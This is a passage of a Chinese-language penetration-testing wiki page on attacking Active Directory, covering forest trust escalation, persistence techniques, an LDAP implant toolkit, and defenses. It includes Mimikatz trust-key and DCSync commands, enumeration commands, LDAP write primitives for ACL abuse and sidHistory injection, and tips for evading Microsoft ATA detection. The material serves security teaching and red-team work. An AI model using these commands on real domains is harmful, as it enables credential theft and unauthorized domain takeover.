### Skeleton Key

在内存中修改 **LSASS** 以建立一个 **通用密码**，从而获得对所有域账户的访问权限。

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[在此了解 SSP (Security Support Provider) 是什么。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来 **以明文捕获** 用于访问机器的 **凭据**。

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个 **新的 Domain Controller** 并使用其来 **推送属性**（如 SIDHistory、SPNs...）到指定对象，**而不留下有关修改的任何日志**。你需要 DA 权限并在 **根域** 内。\
注意如果你使用了错误的数据，会产生相当丑陋的日志记录。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论过如果你有 **足够权限读取 LAPS 密码** 如何提升权限。然而，这些密码也可以用来 **维持持久化**。\
参见：

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着 **攻破单个域可能导致整个 Forest 被攻破**。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个 **域** 的用户访问另一个 **域** 中的资源。它本质上在两个域的认证系统之间创建了一个链接，使认证验证能够无缝流动。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留特定的 **keys**，这些 keys 对信任的完整性至关重要。

在典型场景中，如果用户想访问 **受信域** 中的某个服务，首先必须向其自己域的 DC 请求一种特殊票据，称为 **inter-realm TGT**。该 TGT 使用两个域商定的共享 **key** 进行加密。然后用户将此 TGT 提交给 **受信域的 DC** 以获取服务票据（**TGS**）。受信域的 DC 成功验证 inter-realm TGT 后，会签发一个 TGS，授予用户对该服务的访问权限。

**步骤**：

1. **Domain 1** 中的 **客户端计算机** 开始该过程，使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 如果客户端成功通过认证，DC1 会签发一个新的 TGT。
3. 然后客户端向 DC1 请求一个 **inter-realm TGT**，这是访问 **Domain 2** 资源所需的。
4. inter-realm TGT 使用 DC1 和 DC2 在双向域信任中共享的 **trust key** 进行加密。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果有效，则为客户端想访问的 Domain 2 中的服务器签发一个 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器，该票据用服务器账户的 hash 加密，以便访问 Domain 2 中的服务。

### Different trusts

需要注意的是，**信任可以是单向或双向的**。在双向选项中，两个域将彼此信任，但在**单向**的信任关系中，一个域将是 **trusted**，另一个是 **trusting** 域。在后一种情况下，**你只能从 trusted 域访问 trusting 域内部的资源**。

如果 Domain A 信任 Domain B，则 A 是 trusting 域，B 是 trusted 域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 forest 内常见的设置，子域自动与其父域建立双向传递信任。本质上，这意味着父域和子域之间的认证请求可以无缝流动。
- **Cross-link Trusts**：也称为“shortcut trusts”，在子域之间建立以加快引用过程。在复杂的 forest 中，认证引用通常必须向上到 forest root 然后再下到目标域。通过创建 cross-links，可以缩短这一过程，这在地理上分散的环境中尤其有用。
- **External Trusts**：这些在不同的、不相关的域之间建立，且具有非传递性。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问当前 forest 之外且未通过 forest trust 连接的域中的资源很有用。通过对外部信任实施 SID 筛选可以增强安全性。
- **Tree-root Trusts**：这些信任在 forest root 域与新添加的 tree root 之间自动建立。虽不常见，但在向 forest 添加新的域树以使其保持唯一域名并确保双向传递性时很重要。更多信息见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这类信任是在两个 forest root 域之间的双向传递信任，同时执行 SID 筛选以加强安全措施。
- **MIT Trusts**：这些信任与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专用，适用于需要与 Windows 生态系统之外基于 Kerberos 的系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系也可以是 **传递性**（A 信任 B，B 信任 C，则 A 信任 C）或 **非传递性**。
- 信任关系可以设置为 **双向信任**（双方互相信任）或 **单向信任**（只有一方信任另一方）。

### Attack Path

1. **枚举** 信任关系
2. 检查是否有任何 **security principal**（user/group/computer）对**其他域**的资源有 **访问** 权限，可能通过 ACE 条目或在其他域的组中。寻找 **跨域的关系**（信任很可能就是为此创建的）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻破** 可以 **跨域 pivot** 的 **账户**。

攻击者可通过三种主要机制访问另一个域中的资源：

- **Local Group Membership**：主体可能被添加到机器的本地组，例如服务器上的 “Administrators” 组，从而赋予他们对该机器的重大控制权。
- **Foreign Domain Group Membership**：主体也可以成为外域中某些组的成员。然而，这种方法的有效性取决于信任的性质和组的范围。
- **Access Control Lists (ACLs)**：主体可能在 **ACL** 中被指定，尤其是在 **DACL** 中的 **ACE** 实体，赋予他们访问特定资源的权限。想深入了解 ACLs、DACLs 和 ACEs 的机制的人，可以参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部 security principals。这些将来自 **外部域/forest** 的用户/组。

你可以在 **Bloodhound** 中或使用 powerview 检查：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个受信任的密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_.\
> 你可以使用下面的命令查看当前域使用的是哪一个：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任并使用 SID-History injection 将权限提升到子域/父域（例如提升为 Enterprise admin）：

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解 Configuration Naming Context (NC) 如何被利用至关重要。Configuration NC 是 Active Directory (AD) 环境中跨林（forest）用于存放配置数据的中央存储。该数据会复制到林中的每个 Domain Controller (DC)，可写的 DC 保持 Configuration NC 的可写副本。要利用该机制，必须在某台 DC 上拥有 **SYSTEM 权限**，最好是子 DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含了 AD 林中所有域加入计算机的站点信息。在任何 DC 上以 SYSTEM 权限操作时，攻击者可以将 GPO 链接到 root DC 的站点。此操作可能通过操控应用到这些站点的策略来危及根域。

有关更深入的信息，可参考 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) 的研究。

**Compromise any gMSA in the forest**

一种攻击向量是针对域内有特权的 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任何 DC 上拥有 SYSTEM 权限时，可以访问 KDS Root key 并计算整个林中任意 gMSA 的密码。

详细分析和步骤见：

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor —— 滥用 migration attributes）：

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

附加外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

此方法需要耐心，等待创建新的有特权的 AD 对象。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制权，从而导致对新创建 AD 对象的未授权访问和控制。

可参阅更多内容：[Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 Public Key Infrastructure (PKI) 对象的控制，利用该控制创建一个证书模板，从而使得可以以林中任意用户的身份进行认证。由于 PKI 对象位于 Configuration NC 中，攻陷一个可写的子 DC 就可以执行 ESC5 攻击。

更多细节见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的情况下，攻击者也可以搭建所需组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在本情景中，**你的域被一个外部域信任**，并授予你对其的**未定权限**。你需要找出**你域内哪些主体对外部域拥有什么访问权限**，然后尝试利用它们：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此场景中，**你的域** 正在**授予**来自 **不同域** 的主体一些 **权限**。

然而，当一个 **域被信任** 时，受信任的域会**创建一个用户**，该用户具有**可预测的名称**，并将**受信任密码**作为密码。这意味着可以**利用信任域的用户访问受信任域**来枚举并尝试提升更多权限：

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种危害受信任域的方法是找到在域信任**相反方向**创建的[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种危害受信任域的方法是等待在一台机器上，**来自受信任域的用户可以通过 RDP 登录**。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里**访问受害者的源域**。此外，如果**受害者已挂载其硬盘**，攻击者可以从**RDP 会话**进程将 **backdoors** 存放到硬盘的 **startup folder**。这种技术被称为 **RDPInception**。

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用的缓解措施

### **SID Filtering:**

- 利用 SID history 属性在跨林信任中进行攻击的风险可通过 SID Filtering 缓解，SID Filtering 在所有跨林信任上默认启用。其基础假设是林（forest）而非域（domain）是安全边界，这与 Microsoft 的立场一致。
- 但有一个问题：SID Filtering 可能会中断应用和用户访问，因此有时会被停用。

### **Selective Authentication:**

- 对于跨林信任，使用 Selective Authentication 可确保两个林的用户不会被自动认证。相反，用户需要获得明确权限后才能访问信任的域或林中的域和服务器。
- 需要注意的是，这些措施无法防护对可写的 Configuration Naming Context (NC) 的滥用，也无法防护对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 基于 LDAP 的 AD 滥用（来自主机植入体）

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style 的 LDAP 原语重新实现为在主机植入体（例如 Adaptix C2）内部运行的 x64 Beacon Object Files。操作者使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都沿用当前登录的安全上下文，通过 LDAP (389)（使用 signing/sealing）或 LDAPS (636)（自动信任证书）传输，因此不需要 socks proxies 或磁盘痕迹。

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 将简短名称/OU 路径解析为完整 DN 并导出相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 提取任意属性（包括 security descriptors）以及来自 `rootDSE` 的林/域元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 直接从 LDAP 披露 roasting candidates、delegation 设置，以及已有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出 trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）和继承信息，从而直接给出用于 ACL 权限提升的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提升权限与持久化

- 对象创建 BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在有 OU 权限的任意位置放置新的主体或计算机账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 在发现写属性权限后可以直接劫持目标。
- 面向 ACL 的命令（如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync`）将任何 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、组成员控制或 DCSync 复制权限，而不会留下 PowerShell/ADSI 产物。`remove-*` 对应命令用于清理注入的 ACEs。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` 立即使被入侵的用户可被 Kerberoast；`add-asreproastable`（UAC 切换）在不修改密码的情况下将其标记为可进行 AS-REP roasting。
- 委派宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）可以从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而开启 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入到受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，使攻击者能在滥用 `set-password`、`add-groupmember` 或 `add-spn` 之前，将资产移动到已存在委派权限的 OUs 中。
- 范围严格的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 等）允许在操作者收集凭证或建立持久化后快速回滚，从而最小化遥测。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **Domain Admins 限制**：建议 Domain Admins 仅允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account 权限**：服务不应以 Domain Admin (DA) 权限运行，以维持安全性。
- **临时权限限制**：对于需要 DA 权限的任务，应限制其持续时间。可以通过：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP 中继 缓解**：审计事件 ID 2889/3074/3075，然后在 DCs/客户端上强制 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **实施欺骗技术**

- 实施欺骗包括设置陷阱，例如诱饵用户或计算机，具有诸如密码永不过期或被标记为 Trusted for Delegation 的特性。详细方法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实用示例涉及使用工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **针对用户对象**：可疑指征包括异常的 ObjectSID、不频繁的登录、创建日期以及较低的错误密码计数。
- **一般指征**：将潜在诱饵对象的属性与真实对象进行比较可揭示不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **规避检测系统**

- **Microsoft ATA Detection Bypass**：
- **用户枚举**：避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **票据伪造**：使用 **aes** 密钥生成票据有助于规避检测，因为不会降级到 NTLM。
- **DCSync 攻击**：建议在非 Domain Controller 上执行，以避免 ATA 检测；直接在 Domain Controller 上执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
